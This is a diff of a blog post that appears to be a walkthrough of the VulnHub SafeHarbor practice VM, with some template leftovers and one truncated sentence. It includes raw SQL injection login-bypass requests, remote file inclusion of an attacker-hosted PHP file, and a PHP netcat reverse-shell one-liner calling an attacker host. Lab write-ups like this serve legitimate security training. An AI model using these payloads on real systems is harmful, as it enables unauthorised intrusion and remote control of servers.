@@ -5,32 +5,26 @@ published: true
 
 I enjoyed playing this challenge and thought it would be a great idea to write a walkthrough. Even though most of the techniques required to solve the challenges were well known I tried to use non-traditional paths to some extent. I limited myself from using Metasploit or Cobalt Strike, which are often easily detected during red team engagements. So the goal was to use tools and scripts, that I often bookmarked and read about.
 
-If you want to play along, you can download the VM from Vulnhub here: https://www.vulnhub.com/entry/safeharbor-1,377/
+If you want to play along, you can download the VM from Vulnhub here: [Link to another page](https://www.vulnhub.com/entry/safeharbor-1,377/)
 
 **Description from VulnHub:**
 
 ```
 A harder VM designed to train for both pentesting newer IT infrastructure methodologies as well as network pivot practice.
-
 You'll need to be familiar with pivoting techniques, web app vulnerabilities, Metasploit and Meterpreter, as well as enumeration methodologies and a good bit of patience.
-
 As a note, there are two additional bonus flags that will appear in the /root directory based on pre-defined actions taken during the course of rooting the VM.
-
-
 Works better in VirtualBox than VMware
-
 ```
 
-Text can be **bold**, _italic_, ~~strikethrough~~ or `keyword`.
-
-[Link to another page](another-page).
+As mentioned in the description the VM works well on VirtualBox, I tried Vmware Fusion and DHCP does not seem to work. Once you have the VM up and running, discover the live hosts in your vmnet adapter to find 
 
 **Service discovery scan:**
 
 ```
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-15 16:49 EDT
-Nmap scan report for safeharbor (192.168.128.34)
-Host is up (0.00051s latency).
+$ sudo nmap -sS -sV -Pn 192.168.1.21 -A 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-16 10:47 EDT
+Nmap scan report for 192.168.1.21
+Host is up (0.0046s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -55,12 +49,136 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.51 ms safeharbor (192.168.128.34)
+1   4.64 ms 192.168.1.21
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
+Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
 
 ```
+
+Scanning well known ports gives me something to start with, the attack surface is limited to port 80 running a PHP application and SSH service. Let's go ahead and take a look at the application.
+
+In the meantime, let's also look for common PHP files using wfuzz. This is much faster than using dirbuster in my opinion.
+
+```
+wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ.php -t 500
+```
+
+Sweet, it's a login page. Let's quickly try some SQL injections on the login form fields:
+
+```
+POST / HTTP/1.1
+Host: 192.168.1.21
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Connection: close
+Referer: http://192.168.1.21/
+Cookie: PHPSESSID=acb58e455065ff339e002533dda99949
+Upgrade-Insecure-Requests: 1
+
+user=';--&password=test&s=Login
+```
+
+From the verbose errors, we can deduce that SQL injection is possible, I'm going to try some standard login bypass technique.
+
+```
+POST / HTTP/1.1
+Host: 192.168.1.21
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Connection: close
+Referer: http://192.168.1.21/
+Cookie: PHPSESSID=acb58e455065ff339e002533dda99949
+Upgrade-Insecure-Requests: 1
+
+user=admin%27+or+%271%27%3D%271&password=admin&s=Login
+```
+
+Et voilà! That was easy, considering this was trivial I probably have a longer path to get all the flags!
+
+Let's take a look at the wfuzz output:
+
+```
+root@kali:/tmp/SecLists/Discovery/Web-Content# wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ -t 500
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://192.168.1.21/FUZZ
+Total requests: 5163
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                
+===================================================================
+
+000000029:   200        36 L     97 W     1303 Ch     "login.php"                                                            
+000000111:   200        992 L    5149 W   86320 Ch    "phpinfo.php"                                                          
+
+Total time: 63.60388
+Processed Requests: 5163
+Filtered Requests: 5161
+Requests/sec.: 81.17429
+
+```
+
+Settings in phpinfo.php reveals that the directives for including files are enabled. Let's try LFI/RFI, if that doesn't work I can maybe exploit further using PHP streams.
+
+```
+Registered PHP Streams:  https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar
+
+Directive:
+allow_url_fopen On  On
+allow_url_include On  On
+
+```
+
+A quick test reveals that the parameter "p" uses include function: http://192.168.1.21/OnlineBanking/index.php?p=../../../balance
+
+```
+<br />
+<b>Warning</b>:  include(../../../balance.php): failed to open stream: No such file or directory in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '../../../balance.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />
+
+```
+
+Let me host a PHP file to execute the command 'id' on my Kali (attacker) box and include it to see if that works. 
+
+```
+<?php system('id'); ?>
+```
+
+Start a web server using Python's SimpleHTTPServer:
+
+```
+root@kali:/tmp# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+
+```
+
+That worked!
+
+screenshot3
+
+
+Let's go ahead and get a reverse shell, using the default one available on Kali (/usr/share/webshells/php/php-reverse-shell.php)or you can achieve the same using one of the one liners below. I did some basic checks to verify what shells are available and if netcat is available. Luckily, the version supports "-e" option. If that option is not supported you can read up about it here: [Link to another page](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)
+
+```
+<?php system('nc attacker_ip port -e /bin/sh'); ?>
+```
+
+Great! Now I have a reverse shell:
+
+[![asciicast](https://asciinema.org/a/14.png)](https://asciinema.org/a/14)
 
 There should be whitespace between paragraphs.
 
